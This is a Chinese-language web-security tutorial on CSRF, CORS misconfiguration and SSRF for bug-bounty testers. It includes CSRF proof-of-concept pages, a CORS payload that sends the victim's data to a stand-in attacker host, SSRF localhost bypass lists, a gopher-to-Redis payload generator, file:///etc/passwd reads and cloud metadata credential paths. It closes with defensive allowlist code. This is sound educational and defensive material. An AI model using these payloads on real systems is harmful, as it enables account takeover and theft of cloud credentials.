---
title: 第 6 篇：CSRF 与 SSRF
layout: article
---
# 第 6 篇：CSRF 与 SSRF——借刀杀人，一个借浏览器一个借服务器

这两个漏洞名字像，原理完全不同：

- **CSRF**：借受害者的浏览器，带着他的 Cookie 向目标发请求。攻击者读不到响应，但请求已经执行了。
- **SSRF**：借服务器的手，让服务器去访问攻击者指定的地址。攻击者能读响应，所以能打内网、云元数据、Redis。

CSRF 常见于后台操作、改密码、绑邮箱；SSRF 常见于图片代理、URL 抓取、Webhook、PDF 生成、文件导入。**SSRF 在 SRC 里通常定级更高**，因为它经常能直接摸到内网和云凭证。

---

## 一、CSRF：为什么"读不到响应"也能攻击

CSRF 能成立，需要同时满足：

1. 目标操作**只靠 Cookie 鉴权**，没有额外的随机 token；
2. 参数**可预测**（改密码、加管理员、转账金额固定）；
3. 攻击者能让受害者**在登录状态下访问一个页面**。

浏览器的同源策略不阻止"发送请求"，只阻止"读取响应"。所以攻击者不需要看到结果，只要请求发出去、副作用发生就够了。

### DVWA 改密码实验

DVWA 的 CSRF 关卡（low）把改密码做成 GET：

```text
http://127.0.0.1:8080/vulnerabilities/csrf/?password_new=123456&password_conf=123456&Change=Change
```

登录 DVWA 后直接访问这个 URL，密码就被改成 `123456`。整个过程没有任何 token 校验。

### 写一个自动提交的 PoC

```html
<!DOCTYPE html>
<html>
<body>
  <form id="csrf" action="http://127.0.0.1:8080/vulnerabilities/csrf/" method="GET">
    <input type="hidden" name="password_new" value="hacked123">
    <input type="hidden" name="password_conf" value="hacked123">
    <input type="hidden" name="Change" value="Change">
  </form>
  <script>document.getElementById("csrf").submit();</script>
</body>
</html>
```

把这段保存成 `csrf.html`，在已登录 DVWA 的浏览器里打开，密码会被改掉。**只在本地靶场做。**

### POST 型 CSRF

```html
<form id="csrf" action="https://target.com/api/email" method="POST">
  <input type="hidden" name="email" value="attacker@example.com">
</form>
<script>document.getElementById("csrf").submit();</script>
```

表单跨站提交不受同源策略限制，Cookie 会自动带上（受 SameSite 影响）。

### JSON 接口的 CSRF

如果接口只接受 `application/json`，普通表单发不出去。但有几种情况仍可利用：

1. **服务端不校验 Content-Type**：用 `text/plain` 发 JSON 字符串，`fetch` 不会触发预检：

```html
<script>
fetch("https://target.com/api/email", {
  method: "POST",
  mode: "no-cors",
  credentials: "include",
  headers: {"Content-Type": "text/plain"},
  body: '{"email":"attacker@example.com"}'
});
</script>
```

2. **表单 `enctype=text/plain` 技巧**：

```html
<form action="https://target.com/api/email" method="POST" enctype="text/plain">
  <input name='{"email":"attacker@example.com","x":"' value='"}'>
</form>
```

提交的 body 会变成类似 `{"email":"attacker@example.com","x":""="`，如果后端解析宽松，可能成功。

3. **CORS 配置过宽**：接口允许任意 Origin 带凭证，攻击者不仅能发，还能读响应。

---

## 二、CSRF token 的常见问题

有 token 不代表安全。审核时重点看：

| 问题 | 表现 | 怎么测 |
| --- | --- | --- |
| token 不校验 | 删除 token 参数仍成功 | 直接删掉 `csrf_token` 重放 |
| token 不绑定用户 | A 的 token 能用于 B | 两个账号互换 token |
| token 可预测 | 时间戳、递增 ID、MD5(uid) | 收集多个 token 分析 |
| token 只存在 Cookie | 服务端比较 Cookie 和 body，但都可由子域写入 | 结合子域 XSS/Cookie 注入 |
| token 不刷新 | 一次 token 永久有效 | 重复使用旧 token |
| token 校验可绕过 | 只校验存在、不校验值 | 传空值、`null`、数组 |
| 只校验 Referer | Referer 为空时放行 | 用 `Referrer-Policy: no-referrer` 或直接请求 |

### 测 token 是否真的绑定会话

1. 账号 A 登录，抓一个带 token 的请求；
2. 账号 B 登录，把自己的 token 换成 A 的；
3. 如果 B 的操作成功，说明 token 没绑定用户。

### 测 token 是否可重复使用

同一个 token 连续提交 10 次，如果都成功，说明没有一次性校验。严格来说这不是 CSRF，但会降低攻击成本。

---

## 三、SameSite 和 Referer/Origin 校验

### SameSite 三档

| 值 | 跨站请求是否带 Cookie | 说明 |
| --- | --- | --- |
| `Strict` | 不带 | 从外站点链接过来也不带，最严 |
| `Lax` | 顶层 GET 导航带，POST/iframe/图片不带 | 现代浏览器默认值 |
| `None` | 带 | 必须同时有 `Secure`，否则浏览器拒 |

**Lax 不是绝对安全**：如果改密码/绑邮箱是 GET 请求，顶层导航仍会带 Cookie。所以**状态修改必须用 POST**。

### Referer/Origin 校验的绕过

- 只检查 `Referer` 是否包含目标域名：`https://target.com.evil.com` 也包含；
- 允许空 Referer：用 `<meta name="referrer" content="no-referrer">` 或直接请求；
- 只检查 `Origin` 后缀：`https://evil-target.com` 可能通过；
- 子域信任：`https://any.target.com` 被入侵后可作为跳板。

正确做法是**精确匹配完整 Origin**，并且同时校验 token。

---

## 四、CORS 错误配置：能读响应的 CSRF

CORS 本身不是漏洞，配置错了才是。测法：

```bash
curl -sI https://api.example.com/userinfo \
  -H 'Origin: https://evil.com' | grep -i access-control
```

如果返回：

```http
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true
```

说明任意站点都能带着受害者 Cookie 读接口。PoC：

```html
<script>
fetch("https://api.example.com/userinfo", {credentials: "include"})
  .then(r => r.text())
  .then(d => fetch("https://attacker.example/collect?d=" + encodeURIComponent(d)));
</script>
```

### 常见的错误配置

| 配置 | 风险 |
| --- | --- |
| 反射任意 `Origin` + `Credentials: true` | 任意站点可读 |
| `Access-Control-Allow-Origin: null` + credentials | sandbox iframe / `data:` 页面可读 |
| 信任所有子域 | 任意子域被控即可读 |
| 允许 `http://` 源 | 中间人可读 |
| 预检缓存过长 | 配置改了仍生效 |

**注意：** `Access-Control-Allow-Origin: *` 和 `Credentials: true` 同时出现时，浏览器不会发送凭证，这种配置本身不构成"带凭证读取"，不要误报。真正危险的是"反射 Origin + credentials"。

---

## 五、SSRF：让服务器替你访问内网

SSRF 的成因是服务端拿用户提供的 URL 去发请求，却没有限制目标。典型代码：

```python
# 只在本机跑的靶场
from flask import Flask, request
import requests

app = Flask(__name__)

@app.route("/fetch")
def fetch():
    url = request.args.get("url", "")
    try:
        r = requests.get(url, timeout=5, allow_redirects=False)
        return r.text
    except Exception as e:
        return str(e), 500

if __name__ == "__main__":
    app.run(host="127.0.0.1", port=9000, debug=True)
```

启动：

```bash
python3 ssrf_lab.py
```

正常请求：

```bash
curl 'http://127.0.0.1:9000/fetch?url=http://127.0.0.1:8080/login.php'
```

如果返回 DVWA 登录页，说明服务端替我们访问了本机 8080。再把 `url` 换成内网地址、云元数据地址，就是 SSRF。

### 常见入口

| 功能 | 参数名示例 |
| --- | --- |
| 图片代理/裁剪 | `url`、`image`、`src`、`pic` |
| 远程附件/导入 | `file`、`path`、`link` |
| Webhook | `callback`、`notify_url`、`webhook` |
| PDF/截图生成 | `url`、`page` |
| RSS/订阅 | `feed`、`rss` |
| 翻译/抓取 | `target`、`u`、`host` |
| 分享/预览 | `share`、`preview`、`redirect` |

### 先判断有没有回显

- **有回显**：页面直接显示目标内容，最好办，读内网页面、云元数据。
- **无回显**：只返回"成功/失败"或图片，需要带外检测（DNSLog、Collaborator）。
- **半回显**：返回标题、状态码、响应长度、错误信息，可以盲测端口和路径。

---

## 六、SSRF 绕过：黑名单为什么总漏

### 本机地址的各种写法

```text
http://127.0.0.1
http://localhost
http://127.1
http://127.0.0.1:80
http://2130706433          # 127.0.0.1 的十进制
http://0x7f000001          # 十六进制
http://0177.0.0.1          # 八进制
http://[::1]               # IPv6
http://0.0.0.0
http://127.0.0.1.nip.io    # DNS 指向 127.0.0.1
http://localtest.me
```

不同语言/库的 URL 解析器对 `@`、`#`、`?`、反斜杠、大小写、尾点的处理不同，常见歧义：

```text
http://evil.com@127.0.0.1        # 用户信息是 evil.com，主机是 127.0.0.1
http://127.0.0.1#@evil.com       # # 后是 fragment，主机是 127.0.0.1
http://127.0.0.1?@evil.com
http://127.0.0.1.evil.com        # 不是本机
```

**验证方法：** 把 URL 分别交给目标服务和 `curl` 请求，看它们各自解析到哪个 IP。两边不一致就是绕过点。

### 重定向绕过

如果服务端只校验初始 URL，但会跟随 302：

1. 攻击者服务器返回 `302 Location: http://127.0.0.1/admin`；
2. 服务端校验 `http://attacker.com` 通过；
3. 跟随跳转后访问了内网。

防御要在**每一跳**都重新校验，或者直接禁止跳转。

### DNS Rebinding

1. 攻击者域名第一次解析到公网 IP，校验通过；
2. TTL 设为 0，第二次解析到 `127.0.0.1`；
3. 服务端用第二次解析的 IP 发请求。

这类绕过靠"校验时解析一次、请求时再解析一次"的时间差。防御要**解析一次并把 IP 固定**，或使用网络层出口限制。

---

## 七、协议利用：不止 http

| 协议 | 用途 | 依赖 |
| --- | --- | --- |
| `file://` | 读本地文件 | 语言/库支持 |
| `dict://` | 探测服务、Redis 简单命令 | curl/libcurl |
| `gopher://` | 构造任意 TCP 数据，打 Redis/MySQL/FastCGI | curl/libcurl、PHP |
| `ftp://` | 探测 FTP | 部分库 |
| `http://` | 内网 Web、云元数据 | 通用 |

### file 协议读文件

```text
file:///etc/passwd
file:///c:/windows/win.ini
```

如果回显里出现 `root:x:0:0`，说明能读服务器本地文件。**只读到证明即可，不要读业务配置里的密钥。**

### gopher 打 Redis

Redis 协议是文本行协议。用 Python 生成 gopher payload：

```python
import urllib.parse

def redis_gopher(*args):
    payload = f"*{len(args)}\r\n"
    for a in args:
        payload += f"${len(a)}\r\n{a}\r\n"
    return "gopher://127.0.0.1:6379/_" + urllib.parse.quote(payload, safe="")

print(redis_gopher("INFO"))
```

把输出作为 `url` 参数传给 SSRF 点。如果目标 Redis 未授权，`INFO` 的结果会通过 SSRF 回显。进一步写文件需要目标权限和路径，**只在本地靶场尝试，真实项目验证到 `INFO`/`PING` 就停**。

**注意：** Python `requests` 不支持 `gopher://`，PHP curl、libcurl 支持。测试前先确认目标用的 HTTP 客户端。

### gopher 的其他目标

- MySQL：构造握手包，需要处理二进制，通常用脚本生成；
- FastCGI：构造 `SCRIPT_FILENAME` 执行 PHP；
- SMTP：发邮件；
- Docker API：`gopher` 构造 HTTP 请求打 2375。

这些属于进阶利用，先把手上的 SSRF 回显和元数据读明白，再碰。

---

## 八、云元数据：SSRF 最值钱的目标

云服务器上有一个特殊地址，实例内部可以访问，用来拿临时凭证：

| 云 | 地址 | 说明 |
| --- | --- | --- |
| AWS | `http://169.254.169.254/latest/meta-data/` | IMDSv2 需要先拿 token |
| 阿里云 | `http://100.100.100.200/latest/meta-data/` | 实例元数据 |
| 腾讯云 | `http://metadata.tencentyun.com/latest/meta-data/` | 实例元数据 |
| GCP | `http://metadata.google.internal/computeMetadata/v1/` | 需要 `Metadata-Flavor: Google` |
| Azure | `http://169.254.169.254/metadata/instance?api-version=2021-02-01` | 需要 `Metadata: true` |

### AWS 凭证路径

```text
/latest/meta-data/iam/security-credentials/
/latest/meta-data/iam/security-credentials/<role-name>
```

返回里包含 `AccessKeyId`、`SecretAccessKey`、`Token`。**拿到就停，不要用它调用任何云 API。** 报告里只写"可读取实例角色临时凭证"，把凭证打码。

### IMDSv2

新版 AWS 默认要求：

```bash
TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/
```

普通 SSRF 只能发 GET，打不了 IMDSv2；如果目标用的还是 IMDSv1，就能直接读。这也是为什么云厂商一直在推 IMDSv2。

### 阿里云/腾讯云

```text
http://100.100.100.200/latest/meta-data/
http://100.100.100.200/latest/meta-data/ram/security-credentials/
http://metadata.tencentyun.com/latest/meta-data/
```

同样，读到角色名和临时凭证就停。

---

## 九、无回显 SSRF：用带外通道确认

服务端不返回内容时，用 DNS/HTTP 带外平台确认请求是否发出：

```text
http://your-id.dnslog.cn
http://your-id.burpcollaborator.net
```

把 URL 填进 SSRF 点，看平台有没有收到 DNS 查询或 HTTP 请求。收到只能证明"服务器发起了请求"，**不能证明能读内网**。要证明影响，还需要：

- 用 `http://127.0.0.1:端口` 扫内网端口，通过响应时间/错误差异判断开放；
- 用 `file://` 或内网页面确认回显；
- 用 DNSLog 子域编码数据外带（需要目标能解析任意域名）。

### 盲 SSRF 的端口探测思路

```text
http://127.0.0.1:22
http://127.0.0.1:3306
http://127.0.0.1:6379
http://127.0.0.1:9200
```

根据响应时间、状态码、错误信息差异判断。**不要对内网做大规模扫描**，SRC 里只验证几个关键端口即可。

---

## 十、SSRF 防御：白名单 + 网络层

### 1. 协议和主机白名单

```python
from urllib.parse import urlparse
import ipaddress
import socket

ALLOWED_HOSTS = {"api.example.com", "cdn.example.com"}

def is_safe(url):
    p = urlparse(url)
    if p.scheme not in ("http", "https"):
        return False
    if p.hostname not in ALLOWED_HOSTS:
        return False
    # 解析后检查 IP，防止 DNS 指向内网
    try:
        infos = socket.getaddrinfo(p.hostname, None)
    except socket.gaierror:
        return False
    for info in infos:
        ip = ipaddress.ip_address(info[4][0])
        if (ip.is_private or ip.is_loopback or ip.is_link_local
                or ip.is_reserved or ip.is_multicast):
            return False
    return True
```

**注意：** 这段代码仍有 DNS Rebinding 风险（校验时解析一次，请求时又解析一次）。更稳的做法是：解析一次，拿到 IP 后直接连 IP，并设置 `Host` 头；或者用网络层出口策略禁止访问内网。

### 2. 禁止跳转

```python
requests.get(url, allow_redirects=False, timeout=5)
```

如果业务必须跟随跳转，每一跳都重新走白名单校验。

### 3. 网络层限制

- 业务容器单独出网，禁止访问 RFC1918、`169.254.0.0/16`、`100.100.100.200`；
- 云上开启 IMDSv2，禁用 IMDSv1；
- 内网服务加认证，不要靠"内网就安全"；
- 限制响应大小和类型，防止被当成代理拉大文件。

### 4. 其他

- 不把用户输入直接拼进 URL；
- 对 `file://`、`gopher://`、`dict://` 等协议做白名单；
- 记录出站请求日志，方便发现异常。

---

## 十一、SRC 里怎么测

### CSRF

1. 找状态修改接口：改密码、绑邮箱、加管理员、下单、退款。
2. 看请求里有没有 token；删掉 token 重放，看是否成功。
3. 看 Cookie 的 `SameSite`；如果是 `Lax`，确认接口是不是 GET。
4. 写 PoC HTML，用两个账号验证：A 登录，访问 PoC，A 的设置被改。
5. 报告里写清"受害者需要登录并访问页面"，附 PoC 和前后对比。

### SSRF

1. 找 URL 参数：`url`、`image`、`callback`、`webhook`、`file`、`path`、`target`。
2. 先用自己控制的域名/DNSLog 确认请求发出。
3. 再试 `http://127.0.0.1:80`、`http://127.0.0.1:8080`，看回显/错误差异。
4. 有回显再试云元数据，**只读一层目录就停**。
5. 不要打内网的删除/关机/重启接口；不要用 SSRF 拖数据。
6. 报告里写清"可访问内网/可读取元数据"，附请求和响应，敏感值打码。

---

## 十二、本篇自检清单

- [ ] 能说出 CSRF 成立的三个条件。
- [ ] 在 DVWA 写出并运行一个自动提交的 CSRF PoC。
- [ ] 知道 `SameSite=Lax` 为什么挡不住顶层 GET。
- [ ] 能测 CORS 是否反射 Origin，并写出读取响应的 PoC。
- [ ] 在本地 SSRF 靶场读到 DVWA 页面。
- [ ] 能说出至少 6 种 `127.0.0.1` 的绕过写法。
- [ ] 能解释重定向绕过和 DNS Rebinding。
- [ ] 知道 `file://`、`gopher://`、`dict://` 各能做什么。
- [ ] 能说出 AWS/阿里云元数据地址和凭证路径。
- [ ] 能写出白名单 + 解析后 IP 校验的防御代码。

---

**下一篇：[《文件上传、文件包含与目录穿越》](第7篇-文件上传包含与穿越.md)**：上传绕过讲扩展名、MIME、魔术字节、`.htaccess`、条件竞争；包含讲 `php://filter`、日志包含、Session 包含；穿越讲编码和路径规范化。三个漏洞经常串成一条链：上传图片 → 包含执行 → 拿 shell。
